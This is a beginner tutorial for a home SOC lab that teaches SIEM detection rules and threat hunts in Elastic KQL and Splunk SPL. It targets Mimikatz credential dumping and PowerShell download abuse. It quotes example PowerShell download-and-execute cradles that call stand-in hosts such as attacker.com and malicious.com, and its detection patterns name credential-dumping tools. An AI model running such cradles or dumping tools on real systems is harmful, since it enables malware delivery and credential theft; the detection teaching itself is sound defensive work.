# Getting Started with SIEM Detection & Threat Hunting

This guide walks you through your first detection rule and hunt in 30 minutes.

## Prerequisites

✅ Home SOC Lab deployed and running  
✅ SIEM (Elastic or Splunk) with logs flowing  
✅ Windows events visible in SIEM  
✅ Basic SIEM UI familiarity  

---

## Part 1: Verify Your SIEM Connection (5 minutes)

### For Elastic Stack

1. **Open Kibana**
   ```
   URL: http://192.168.100.30:5601
   ```

2. **Check Available Indices**
   - Menu → Analytics → Discover
   - Select index pattern: `winlogbeat-*`
   - Should show recent data

3. **Sample Query**
   ```
   host.name:"Windows-Target"
   ```
   Should return Windows events

### For Splunk

1. **Open Splunk**
   ```
   URL: http://192.168.100.30:8000
   Username: admin
   ```

2. **Access Search**
   - Ctrl+K (search)
   - Run: `index=windows | stats count`
   - Should return count > 0

---

## Part 2: Your First Detection Rule (15 minutes)

### Objective

Detect when Mimikatz (credential dumping tool) is executed.

### Understanding the Attack

**What Happens**:
1. Attacker runs Mimikatz on Windows
2. Sysmon logs process creation (Event ID 1)
3. Command line contains "mimikatz" or "lsadump"
4. Detection rule triggers alert

**Where It Appears**:
- Sysmon Event ID 1 (Process Creation)
- Field: `Image` or `CommandLine`
- Value: Contains "mimikatz" or "lsadump::sam"

### Write the Detection

#### Elastic KQL

**File**: `detections/credential-dumping/elastic-kql.txt`

```
process.name:"mimikatz.exe" OR 
  process.command_line:(*lsadump* OR *sekurlsa* OR *vault::cred*)
```

**How to Use**:

1. Kibana → Discover
2. Select `winlogbeat-*` index
3. Paste query in search box
4. Press Enter
5. Results should show any Mimikatz execution

#### Splunk SPL

**File**: `detections/credential-dumping/splunk-spl.txt`

```spl
index=windows source="WinEventLog:Microsoft-Windows-Sysmon/Operational" 
EventCode=1 (Image="*mimikatz*" OR CommandLine="*lsadump*" OR 
  CommandLine="*sekurlsa*" OR CommandLine="*vault*")
| stats count by Image, CommandLine, user, Computer
```

**How to Use**:

1. Splunk → Search
2. Paste query
3. Click "Search"
4. Results show process executions

---

## Part 3: Test the Detection (10 minutes)

### Option A: Test Against Existing Logs

If you've already run attack scenarios:

**Elastic**:
```
process.name:"mimikatz.exe" OR process.command_line:(*lsadump* OR *sekurlsa*)
```

**Splunk**:
```spl
index=windows EventCode=1 Image="*mimikatz*"
```

### Option B: Simulate Attack (Real Test)

1. **Deploy Home SOC Lab Attack Scenario**
   - Follow: `Home-SOC-Lab/attack-scenarios/001-credential-theft/`

2. **Run Attack**
   ```
   From Kali VM, execute Mimikatz on Windows Target
   ```

3. **Check Detection**
   - Run query above in SIEM
   - Should see Mimikatz process execution
   - Verify command line captured

---

## Part 4: Your First Threat Hunt (30 minutes)

### Hunting Objective

Find all instances of PowerShell being used to download files from the internet.

### Threat Model

**Why This Matters**:
- PowerShell DownloadString is common malware delivery
- Attackers use it to fetch payloads
- Detecting this pattern catches many infections

### The Hunt

#### Step 1: Understand the Attack

**PowerShell Commands to Hunt**:
```powershell
(New-Object Net.WebClient).DownloadString('http://attacker.com')
Invoke-WebRequest -Uri http://attacker.com -OutFile malware.exe
iex(New-Object Net.WebClient).DownloadString('...')
```

**How It Appears in Logs**:
- Event ID: 4104 (PowerShell Script Block)
- Field: ScriptBlockText
- Contains: "DownloadString" or "OutFile" or "iex"

#### Step 2: Write Hunting Query

**Elastic KQL**:
```
event.code:4104 AND process.name:powershell.exe AND 
  (powershell.scriptblock_text:*DownloadString* OR 
   powershell.scriptblock_text:*OutFile* OR 
   powershell.scriptblock_text:*iex*)
```

**Splunk SPL**:
```spl
index=windows EventCode=4104 source="*PowerShell*"
(ScriptBlockText="*DownloadString*" OR ScriptBlockText="*OutFile*" OR 
  ScriptBlockText="*iex*")
| stats count by user, ScriptBlockText, Computer
```

#### Step 3: Execute Hunting Query

1. Run query in SIEM
2. Review results
3. For each result:
   - Is it legitimate? (like Windows Update checks)
   - Is it suspicious? (downloading .exe files)

#### Step 4: Analyze Findings

For each result ask:

**Is this legitimate?**
- Script downloads from microsoft.com? (Usually OK)
- Running from C:\Windows\System32? (Usually OK)
- User is System? (Usually OK)

**Is this suspicious?**
- Script downloads from attacker.com? (Suspicious)
- Running from C:\Users\[user]\AppData? (Suspicious)
- User is regular employee? (More suspicious)
- Downloads .exe file? (Very suspicious)
- IEX (Invoke-Expression) used? (Suspicious - code execution)

#### Step 5: Document Findings

For each suspicious finding, document:
```
Date/Time: 2026-05-18 14:30:00
Computer: Windows-Target
User: admin
Command: iex(New-Object Net.WebClient).DownloadString('http://malicious.com/payload')
URL: http://malicious.com/payload
Assessment: SUSPICIOUS
Action: Alert analysts, investigate source
```

---

## Part 5: Understanding Query Languages

### Elastic KQL (Kibana Query Language)

**Basic Syntax**:
```
field:value
field:(value1 OR value2)
field:[5 TO 10]
field:*wildcard*
-field:value (NOT)
```

**Examples**:
```
# Find process executions
process.name:cmd.exe

# Find Sysmon events
event.module:sysmon AND event.id:1

# Find recent events
@timestamp:[now-1h TO now]

# Combine multiple conditions
host.name:Windows-Target AND process.name:powershell.exe AND 
  process.command_line:*iex*
```

### Splunk SPL (Search Processing Language)

**Basic Syntax**:
```spl
index=indexname
| search field="value"
| stats count by field
| chart count by field
| table field1, field2
```

**Examples**:
```spl
# Simple search
index=windows EventCode=1 Image="*cmd.exe"

# Count by field
index=windows EventCode=1 | stats count by Image

# Chart over time
index=windows EventCode=1 | timechart count by Image

# Complex query
index=windows source="WinEventLog:Microsoft-Windows-Sysmon/Operational"
EventCode=1 CommandLine="*powershell*" CommandLine="*iex*"
| stats count by user, Computer
```

---

## Part 6: Common Hunting Queries

### Find Credential Dumping

**Elastic**:
```
process.name:(mimikatz.exe OR procdump.exe OR hashdump.exe)
```

**Splunk**:
```spl
index=windows EventCode=1 Image IN (mimikatz.exe, procdump.exe, hashdump.exe)
```

### Find Suspicious Services

**Elastic**:
```
event.code:7045 AND service.name:*suspicious*
```

**Splunk**:
```spl
index=windows EventCode=7045 ServiceName="*ADMIN$*" OR ServiceName="*C$*"
```

### Find Scheduled Task Abuse

**Elastic**:
```
event.code:4698 AND process.command_line:*powershell*
```

**Splunk**:
```spl
index=windows EventCode=4698 CommandLine="*powershell*"
```

---

## Part 7: Next Steps

### Beginner

1. ✅ Run first detection rule (you did this!)
2. ⏭️ Run first hunt (you did this!)
3. ⏭️ Study credential dumping detection
4. ⏭️ Practice hunting for PowerShell abuse

### Intermediate

1. ⏭️ Study lateral movement detection
2. ⏭️ Hunt for unusual authentication
3. ⏭️ Create custom detection rule
4. ⏭️ Build hunting dashboard

### Advanced

1. ⏭️ Correlate multiple events
2. ⏭️ Create behavioral anomaly hunts
3. ⏭️ Implement threat intelligence
4. ⏭️ Build alert rules in SIEM

---

## 🎓 Learning Resources

### Detection Rules
- Start with: `detections/credential-dumping/`
- Read: README.md in each detection directory
- Study all three formats: Sigma, Splunk, Elastic

### Threat Hunting
- Start with: `threat-hunting/playbooks/`
- Follow: Step-by-step hunting instructions
- Document: Your findings and process

### Reference
- Windows Event Log IDs: `resources/siem-query-reference.md`
- Query Language Guide: `resources/siem-query-reference.md`
- MITRE Mapping: `resources/mitre-detection-mapping.md`

---

## ⚠️ Troubleshooting

### Query Returns No Results

**Possible Causes**:
1. Index name wrong
   - Elastic: Check `winlogbeat-*` exists
   - Splunk: Check `windows` index exists
2. No events collected
   - Verify Winlogbeat service running
   - Check network connectivity to SIEM
3. Field name wrong
   - Review sample events first
   - Note exact field names

### Query Returns Too Many Results

**Solutions**:
1. Add more specific conditions
2. Filter by time range
3. Exclude known legitimate patterns
4. Add username/computer filters

### Understanding Query Errors

**Error**: "Invalid query syntax"
- Check for missing quotes
- Verify parenthesis match
- Review syntax examples

**Error**: "Index not found"
- Verify index name spelling
- Check logs are flowing to SIEM
- Create index pattern if needed

---

## ✨ Tips for Success

1. **Start Simple**: Test with basic queries first
2. **Read Sample Events**: Understand fields before writing rules
3. **Use Wildcards**: `field:*value*` is your friend
4. **Test Incrementally**: Add one condition at a time
5. **Document Learning**: Note new patterns you discover
6. **Practice Regularly**: Hunt weekly to build skills
7. **Share Findings**: Document discoveries for the team

---

**Congratulations!** 🎉 You've completed your first detection rule and threat hunt!

Next: Explore other detection rules in `detections/` directory.

**Continue Learning**: Follow structured path in main README.md